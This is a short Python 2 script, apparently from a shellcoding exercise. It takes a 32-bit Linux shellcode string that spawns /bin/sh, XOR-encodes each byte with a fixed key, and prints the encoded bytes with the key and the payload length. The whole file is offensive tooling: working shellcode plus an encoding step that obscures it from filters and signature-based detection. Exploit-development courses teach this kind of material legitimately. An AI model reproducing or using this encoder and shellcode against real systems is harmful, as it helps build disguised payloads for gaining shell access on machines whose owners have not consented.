#!/usr/bin/python

# Simple /bin/sh shellcode
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""
key = 22

for x in bytearray(shellcode):
	# Simple Xor encoding
	x = x ^ key
	encoded += hex(x) + ","

encoded = encoded[:-1] + "," + hex(key)
print encoded
print "Len : {}".format(len(bytearray(shellcode)))
